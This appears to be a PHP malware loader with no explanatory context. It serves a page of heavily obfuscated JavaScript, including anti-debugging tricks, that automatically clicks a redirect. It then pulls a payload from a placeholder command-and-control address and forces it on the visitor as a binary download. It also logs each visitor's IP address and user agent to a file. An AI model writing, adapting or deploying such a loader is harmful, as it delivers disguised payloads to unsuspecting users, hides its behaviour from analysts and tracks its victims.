<?php

	//>> loader

	if( empty($_GET['e']) ){
		exit('DONE');
	}

	if( empty( $_GET['ok'] ) ){

		$redirect = '/zp.php?e=' . $_GET['e'] . '&ok=1';

		/*
		<script type="text/javascript">
			var LINK = document.getElementById('lnk').getAttribute("data-h");

			var link = document.createElement("a");
			link.id = 'cr';
			link.href = LINK;

			link.click();
		</script>
		*/

?>

	<!DOCTYPE html>
	<html>
	<head>
		<title></title>
	</head>
	<body>

		<div id="lnk" data-h="<?= $redirect ?>"></div>

		<script type="text/javascript">var a=['hDJIy','{}.constructor(\x22return\x20this\x22)(\x20)','bUEak','wKhMV','IZKTg','constructor','test','trace','GjZFp','BWMYi','CmdRA','debu','click','bSYNm','VzDqs','IyCnP','BTEqg','lgSLA','call','PSYcy','DdVBH','JKHzZ','log','console','bYZhg','DddBh','FUNDx','esiXT','tVYSJ','kSfrX','GlkFj','bKmSa','createElement','HVCMe','tnVSw','QnlOZ','input','PaoBi','LEatg','SbVPh','bind','AgJXz','prototype','AqNeo','warn','1|3|2|5|0|4','LWTlB','apply','yOisn','action','JwaSc','href','function\x20*\x5c(\x20*\x5c)','info','jBosn','error','NdOGa','HYJdv','uswCt','chain','SezAQ','tCnDv','qDmZZ','BDgRR','WmYRy','DVnGm','EOKFi','toString','JZfxj','stateObject','counter','oFdVS','getElementById','length','fmwdZ','MPRfv','kreSt','data-h','string','OUZRZ','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','1|2|3|4|0','XJGcx','pVpFx','sVVJi','getAttribute','QXQHf','prkCG','jAOrv','XGDQC','qIqyP','kYXzW','lnk','dvtei','sfMnm','gger','qlkDa','ADdAV','__proto__'];(function(b,c){var d=function(e){while(--e){b['push'](b['shift']());}};d(++c);}(a,0xf5));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var V=b,C=function(){var I=b,g={'esiXT':function(i,j){return i(j);},'AqNeo':function(i,j){return i===j;},'jBosn':I('0x24')},h=!![];return function(i,j){var L=I,k={'DhazZ':function(m,n){var J=b;return g[J('0x4f')](m,n);},'jAOrv':function(m,n){var K=b;return g[K('0x5f')](m,n);},'BTEqg':g[L('0x7')]},l=h?function(){var M=L;if(k[M('0x29')](k['BTEqg'],k[M('0x44')])){if(j){var m=j[M('0x0')](i,arguments);return j=null,m;}}else{function n(){k['DhazZ'](h,0x0);}}}:function(){};return h=![],l;};}();(function(){var N=b,g={'kreSt':function(h,i){return h+i;},'LWTlB':N('0x3f'),'yOisn':N('0x30'),'wKhMV':'stateObject','xieEO':N('0x5'),'oFdVS':N('0x21'),'bUEak':function(h,i){return h(i);},'MPRfv':'init','AgJXz':function(h,i){return h+i;},'qlkDa':N('0xc'),'NdOGa':N('0x58'),'bSYNm':function(h,i){return h===i;},'QnlOZ':'NOFNb','qIqyP':N('0xe'),'XGDQC':function(h){return h();},'OUZRZ':function(h,i,j){return h(i,j);}};g[N('0x20')](C,this,function(){var O=N,h=new RegExp(g['xieEO']),i=new RegExp(g[O('0x18')],'i'),j=g[O('0x36')](H,g[O('0x1c')]);if(!h['test'](g[O('0x5d')](j,g[O('0x31')]))||!i[O('0x3a')](g['AgJXz'](j,g[O('0x9')])))g[O('0x36')](j,'0');else{if(g[O('0x41')](g[O('0x57')],g[O('0x2b')])){function k(){var P=O;(function(){return![];}[P('0x39')](g[P('0x1d')](g[P('0x62')],g[P('0x1')]))[P('0x0')](g[P('0x37')]));}}else g[O('0x2a')](H);}})();}());var D=function(){var Q=b,g={'QXQHf':function(i,j){return i===j;},'VOGxM':Q('0x49')},h=!![];return function(i,j){var k={'DdVBH':function(m,n){var R=b;return g[R('0x27')](m,n);},'tVYSJ':g['VOGxM']},l=h?function(){var S=b;if(k[S('0x48')](k['tVYSJ'],k[S('0x50')])){if(j){var m=j['apply'](i,arguments);return j=null,m;}}else{function n(){var T=S;if(k){var o=o[T('0x0')](p,arguments);return q=null,o;}}}}:function(){};return h=![],l;};}(),E=D(this,function(){var U=b,g={'jKWFt':U('0x22'),'XJGcx':function(t,u){return t<u;},'LEatg':U('0x61'),'bYZhg':function(t,u){return t(u);},'DddBh':function(t,u){return t+u;},'uBGVZ':function(t,u){return t+u;},'DVnGm':'return\x20(function()\x20','ADdAV':U('0x35'),'SbVPh':function(t){return t();},'IZKTg':U('0x4a'),'FUNDx':U('0x60'),'BDgRR':U('0x6'),'OkSIg':U('0x8'),'VzDqs':'exception','SsVeG':'table','uswCt':U('0x3b')},h=g['jKWFt']['split']('|'),i=0x0;while(!![]){switch(h[i++]){case'0':for(var j=0x0;g[U('0x23')](j,s[U('0x1a')]);j++){var k=g[U('0x5a')]['split']('|'),l=0x0;while(!![]){switch(k[l++]){case'0':m[U('0x14')]=n[U('0x14')][U('0x5c')](n);continue;case'1':var m=D[U('0x39')][U('0x5e')][U('0x5c')](D);continue;case'2':var n=r[o]||m;continue;case'3':var o=s[j];continue;case'4':r[o]=m;continue;case'5':m[U('0x33')]=D['bind'](D);continue;}break;}}continue;case'1':var p;continue;case'2':try{var q=g[U('0x4c')](Function,g[U('0x4d')](g['uBGVZ'](g[U('0x12')],g[U('0x32')]),');'));p=g[U('0x5b')](q);}catch(t){p=window;}continue;case'3':var r=p[U('0x4b')]=p[U('0x4b')]||{};continue;case'4':var s=[g[U('0x38')],g[U('0x4e')],g[U('0x10')],g['OkSIg'],g[U('0x42')],g['SsVeG'],g[U('0xb')]];continue;}break;}});E();var F=document[V('0x19')](V('0x2d'))[V('0x26')](V('0x1e')),G=document[V('0x54')]('a');G['id']='cr',G[V('0x4')]=F,G[V('0x40')]();function H(g){var W=V,h={'SezAQ':'while\x20(true)\x20{}','kYXzW':W('0x17'),'PaoBi':function(j,k){return j!==k;},'GlkFj':'Jylid','HYJdv':W('0x11'),'WtLwG':function(j,k){return j(k);},'ZtRJN':function(j,k){return j===k;},'tnVSw':W('0x2f'),'EUmow':'urFQJ','JwaSc':function(j,k){return j===k;},'HVCMe':W('0x1f'),'IyCnP':W('0x1b'),'prkCG':function(j,k){return j!==k;},'BWMYi':function(j,k){return j+k;},'JZfxj':function(j,k){return j/k;},'cGfDb':'length','dMMXr':function(j,k){return j===k;},'kSfrX':function(j,k){return j%k;},'dvtei':function(j,k){return j+k;},'qDmZZ':W('0x3f'),'EOKFi':'gger','bKmSa':W('0x2'),'HQLti':function(j,k){return j+k;},'hDJIy':W('0x16'),'sVVJi':function(j,k){return j+k;},'PSYcy':function(j,k){return j!==k;},'CmdRA':W('0x3c')};function i(j){var X=W,k={'lgSLA':function(l,m){return h['WtLwG'](l,m);}};if(h['ZtRJN'](h[X('0x56')],h['EUmow'])){function l(){var Y=X,m=j[Y('0x0')](k,arguments);return l=null,m;}}else{if(h[X('0x3')](typeof j,h[X('0x55')])){if(h[X('0x59')](h[X('0x43')],h[X('0x43')])){function m(){var Z=X;return function(n){}[Z('0x39')](h[Z('0xd')])[Z('0x0')](h[Z('0x2c')]);}}else return function(n){}[X('0x39')](h[X('0xd')])['apply'](h['kYXzW']);}else h[X('0x28')](h[X('0x3d')]('',h[X('0x15')](j,j))[h['cGfDb']],0x1)||h['dMMXr'](h[X('0x51')](j,0x14),0x0)?function(){var a0=X;if(h[a0('0x59')](h[a0('0x52')],h[a0('0xa')]))return!![];else{function n(){var a1=a0;if(j)return m;else k[a1('0x45')](n,0x0);}}}['constructor'](h[X('0x2e')](h[X('0xf')],h[X('0x13')]))['call'](h[X('0x53')]):function(){return![];}['constructor'](h['HQLti'](h[X('0xf')],h[X('0x13')]))[X('0x0')](h[X('0x34')]);h['WtLwG'](i,++j);}}try{if(h[W('0x47')](h['CmdRA'],h[W('0x3e')])){function j(){var a2=W;(function(){return!![];}[a2('0x39')](h[a2('0x25')](h[a2('0xf')],h[a2('0x13')]))[a2('0x46')](h[a2('0x53')]));}}else{if(g)return i;else h['WtLwG'](i,0x0);}}catch(k){}}</script>

	</body>
	</html>

<?php

		exit(''); // done echo script
	}

	function getRealIpAddr()
	{
	    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
	    {
	      $ip=$_SERVER['HTTP_CLIENT_IP'];
	    }
	    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
	    {
	      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	    }
	    else
	    {
	      $ip=$_SERVER['REMOTE_ADDR'];
	    }
	    return $ip;
	}

	$links = [
		'http://<C2 IP>.php',
	];

	shuffle($links);

	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename=' . $_GET['e']);
	header('Content-Transfer-Encoding: binary');
	header('Connection: Keep-Alive');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Pragma: public');

	$outfilepath = __DIR__ . '/big__stat.txt';

	foreach ($links as $link) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 20,
		    )
		));

		$data = file_get_contents( $link , false, $ctx);

		if( strlen($data) < 10000 ){
			continue;
		}

		file_put_contents(
			$outfilepath,
			date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
			FILE_APPEND
		);

		echo $data;

		break;
	}

	//<< loader
